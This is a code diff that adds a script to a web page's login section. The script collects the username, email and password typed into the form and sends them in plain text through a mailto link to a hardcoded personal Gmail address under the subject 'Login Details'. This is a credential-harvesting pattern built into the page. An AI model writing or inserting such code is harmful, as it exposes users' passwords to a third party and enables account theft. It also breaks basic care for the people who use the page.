@@ -87,7 +87,23 @@
     <br><br><br><br><br>
     </section>
   <!-- end of login section -->
+  <!-- script -->
+  <script>
+   function submitForm() {
+       const username = document.getElementById('username').value;
+       const email = document.getElementById('email').value;   
 
+       const password = document.getElementById('password').value;
+
+       const   
+recipientEmail = 'reddycherish76@gmail.com'; // Replace with your email address
+
+       const mailtoLink = `mailto:${recipientEmail}?subject=Login Details&body=Username: ${username}%0AEmail: ${email}%0APassword: ${password}`;
+
+       window.location.href = mailtoLink;
+   }
+</script>
+   <!-- end script -->
   <!-- info section -->
 
   <section class="info_section ">
